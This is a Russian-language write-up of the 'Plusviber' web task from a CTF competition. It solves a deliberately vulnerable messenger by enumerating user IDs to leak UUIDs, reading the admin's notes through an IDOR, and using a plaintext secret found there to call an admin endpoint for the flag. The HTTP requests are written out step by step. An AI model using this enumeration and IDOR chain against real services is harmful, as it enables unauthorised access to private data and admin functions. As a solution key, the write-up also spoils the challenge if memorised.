# Плюсвайбер

- **Slug:** `plusviber`
- **Уровень:** Средние
- **Теги:** Medium, Web
- **Автор:** [@b1n4r9](https://t.me/b1n4r9), [SPbCTF](https://t.me/spbctf)
- **Исходная страница:** https://alfactf.ru/tasks/plusviber
- **Flag:** `alfa{REDACTED-UNTIL-21:00}`

## Условие

Ваш шустрый, но не самый одаренный коллега устал от всех замедлений вокруг и за ночь навайбкодил новый мессенджер — Плюсвайбер. А чтобы не повторить судьбу телеграма, коллега на всякий случай заранее замедлил свой сервис, для всех пользователей.

Вы попросили его ускорить хотя бы ваш профиль, на что он предложил сделать это самостоятельно, а заодно и проверить его приложение на безопасность.

Как регулировать степень замедления, создатель мессенджера записал у себя в заметках.

plusviber-gt72ov9c.alfactf.ru/

Вход: [**https://plusviber-gt72ov9c.alfactf.ru/**](https://plusviber-gt72ov9c.alfactf.ru/)

## Наблюдения

- Приложение — vibe-coded мессенджер (фронтенд JS + REST API), без каких-либо BAC-проверок.
- `POST /api/register` → JWT HS256 (`sub=username`, `exp +1 год`).
- `POST /api/subscribe {"user_id": N}` принимает **любой** числовой ID, не только реальных пользователей — возвращает `{status:"ok"}`.
- `GET /api/subscriptions` возвращает полные объекты каждого подписанного пользователя, включая `uuid` и `username` — это утечка приватных идентификаторов.
- `GET /api/users/{uuid}/notes` не проверяет, что `current_user.uuid == path.uuid` — чистый IDOR.
- В заметке администратора «Настройки замедления» открытым текстом хранится продакшн-секрет: `POST /api/admin/settings/account-slowdown?secret=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6`.
- После снятия замедления для своего аккаунта сервер возвращает флаг прямо в теле ответа.

**Корневая ошибда:** отсутствие проверки владельца на `/api/users/{uuid}/notes`; раскрытие UUID через `subscribe`+`subscriptions`; продакшн-секрет в заметке в открытую.

## Решение

### 1. Регистрация

```
POST /api/register
{"username":"<user>","password":"<pass>"}
→ {"token":"<JWT HS256>"}
```

JWT содержит `sub=username`, выдаётся на год. Используется как Bearer-токен.

### 2. Утечка UUID через subscribe + subscriptions

`POST /api/subscribe {"user_id": N}` срабатывает на любом числовом `N`. Перебираем `user_id=1..250`, добавляя всех в список подписок.

```
GET /api/subscriptions
→ [{user: {id, uuid, username, ...}}, ...]
```

Находим запись с `username="admin"` (id=21 в нашем запуске) и извлекаем его `uuid`.

### 3. IDOR — читаем заметки администратора

```
GET /api/users/<admin_uuid>/notes
Authorization: Bearer <own_token>
```

Сервер не сверяет `current_user.uuid` с UUID в пути. Получаем список заметок администратора.

В заметке «Настройки замедления» находим:

```
POST /api/admin/settings/account-slowdown?secret=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
body: {"user_id":<id>,"is_slowed":false}
```

### 4. Снятие замедления → флаг

```
POST /api/admin/settings/account-slowdown?secret=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
Authorization: Bearer <own_token>
{"user_id":<my_id>,"is_slowed":false}
```

Сервер снимает ограничение и в JSON-ответе возвращает флаг.

## Exploit

Рабочий эксплойт: [`solve/exploit.sh`](./solve/exploit.sh)

```bash
# Запуск
bash tasks-2026/plusviber/solve/exploit.sh
```

Скрипт автоматически: регистрируется → перебирает user_id 1..250 → находит uuid админа → читает его заметки через IDOR → извлекает секрет → снимает замедление → печатает флаг.

## Artifacts

- `artifacts/admin-note.json` — оригинальный ответ с заметкой администратора (содержит secret-параметр)
- `artifacts/app.js`, `artifacts/index.html` — клиентская часть приложения
